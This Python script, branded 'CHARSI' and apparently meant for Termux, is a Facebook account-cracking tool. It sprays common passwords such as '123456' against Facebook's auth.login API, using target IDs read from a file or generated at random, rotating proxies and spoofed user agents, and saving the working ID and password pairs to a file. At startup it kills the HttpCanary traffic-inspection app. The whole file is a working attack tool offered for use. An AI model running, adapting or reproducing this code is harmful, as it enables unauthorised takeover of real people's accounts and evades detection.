import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
import requests
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse

# --- Setup & Security ---
def run_system_command(command):
    os.system(f'{command} >/dev/null 2>&1')

run_system_command('chmod 700 /data/data/com.termux/files/usr/bin')
run_system_command('pkill -f httcanary')

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

def pro_banner():
    return """
\x1b[1;92m
 ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗██╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║
██║     ███████║███████║██████╔╝███████╗██║
██║     ██╔══██║██╔══██║██╔══██╗╚════██║██║
╚██████╗██║  ██║██║  ██║██║  ██║███████║██║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝

\x1b[1;92m──────────────────────────────────────────
\x1b[1;96m   ➤ \x1b[1;92mCreator        : \x1b[1;97mCHARSI
\x1b[1;96m   ➤ \x1b[1;92mTool Type      : \x1b[1;97mFile + Old Clone + Proxy
\x1b[1;96m   ➤ \x1b[1;92mVersion        : \x1b[1;97m2.0 (Premium)
\x1b[1;92m──────────────────────────────────────────"""

def linex():
    print(f"\x1b[1;92m──────────────────────────────────────────")

def clear():
    os.system('clear')
    print(pro_banner())

class UserAgentGenerator:
    def generate_user_agent(self):
        # Latest 2026 Headers
        android_v = random.choice(['12', '13', '14', '15'])
        model = random.choice(['SM-S928B', 'Pixel 9 Pro', 'V2303', 'RMX3840', 'TECNO-KJ8'])
        fb_v = random.choice(['542.0.0.37.140', '533.0.0.49.79'])
        return f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(130, 145)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};]"

class CHARSICracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.proxies = []
        self.color = NebulaColors()
        self.ua_gen = UserAgentGenerator()
        self.fetch_proxies()

    def fetch_proxies(self):
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text
            self.proxies = res.splitlines()
        except: self.proxies = []

    def main_menu(self):
        clear()
        print(f" {self.color.W}[1] {self.color.G}FILE CLONING")
        print(f" {self.color.W}[2] {self.color.G}OLD ID CLONING (2009-2013)")
        print(f" {self.color.W}[3] {self.color.G}RANDOM CLONING")
        print(f" {self.color.W}[0] {self.color.R}EXIT")
        linex()
        choice = input(f" {self.color.C}➤ Choose: {self.color.W}").strip()
        
        if choice in ('1', '01'): self.file_cloner()
        elif choice in ('2', '02'): self.old_cloner_menu()
        elif choice in ('3', '03'): self.execute_breach('10008')
        else: sys.exit()

    def file_cloner(self):
        clear()
        print(f" {self.color.W}➤ Example: /sdcard/ids.txt")
        file_path = input(f" {self.color.C}➤ Path: {self.color.W}").strip()
        try:
            ids = open(file_path, 'r').read().splitlines()
            passlist = ['123456', '12345678', '123456789', '786786', 'password', 'facebook']
            self.start_cloning(ids, passlist, "FILE")
        except:
            print(f" {self.color.R}➤ File not found!"); time.sleep(2); self.main_menu()

    def old_cloner_menu(self):
        clear()
        series = {'1':'100000', '2':'100001', '3':'100002', '4':'100003'}
        for k, v in series.items():
            print(f" {self.color.W}[{k}] {self.color.G}{v}")
        linex()
        c = input(f" {self.color.C}➤ Choose: {self.color.W}").strip()
        if c in series: self.execute_breach(series[c])
        else: self.main_menu()

    def execute_breach(self, prefix):
        clear()
        try: limit = int(input(f" {self.color.G}➤ Limit: {self.color.W}"))
        except: limit = 1000
        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456', '12345678', '123456789', '786786', '112233']
        self.start_cloning(targets, passlist, prefix)

    def start_cloning(self, targets, passlist, method):
        with tred(max_workers=30) as executor:
            clear()
            print(f" {self.color.W}➤ Targets : {self.color.G}{len(targets)}")
            print(f" {self.color.W}➤ Method  : {self.color.G}GRAPH API / {method}")
            linex()
            for uid in targets:
                executor.submit(self.breach_target, uid, passlist)
        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.G}[CHARSI] {self.loop}|OK:{len(self.oks)}|CP:{len(self.cps)} {self.color.W}')
        sys.stdout.flush()
        uid = target.split('|')[0] if '|' in target else target
        for password in passlist:
            if self.try_breach(uid, password): break

    def try_breach(self, uid, password):
        try:
            ua = self.ua_gen.generate_user_agent()
            proxy = random.choice(self.proxies) if self.proxies else None
            buffer = BytesIO()
            c = pycurl.Curl()
            payload = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': uid, 'password': password, 'generate_session_cookies': '1',
                'method': 'auth.login', 'credentials_type': 'password', 'source': 'login',
            }
            c.setopt(c.URL, 'https://b-api.facebook.com/method/auth.login')
            if proxy: c.setopt(c.PROXY, proxy)
            c.setopt(c.HTTPHEADER, [f'User-Agent: {ua}', 'Content-Type: application/x-www-form-urlencoded'])
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, urllib.parse.urlencode(payload))
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 12)
            c.perform()
            res = json.loads(buffer.getvalue().decode('utf-8'))
            c.close()
            if 'access_token' in res or 'session_key' in res:
                print(f"\r  {self.color.G}➤ SUCCESS {self.color.W}{uid}|{self.color.G}{password}")
                self.oks.append(uid)
                with open('/sdcard/CHARSI-OK.txt', 'a') as f: f.write(f'{uid}|{password}\n')
                return True
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                self.cps.append(uid)
                return True
        except: pass
        return False

    def display_results(self):
        linex()
        print(f" {self.color.G}➤ OK : {len(self.oks)} (Saved: /sdcard/CHARSI-OK.txt)")
        print(f" {self.color.R}➤ CP : {len(self.cps)}")
        input(f"\n {self.color.C}Press Enter to return...")
        self.main_menu()

if __name__ == "__main__":
    try: CHARSICracker().main_menu()
    except KeyboardInterrupt: sys.exit()
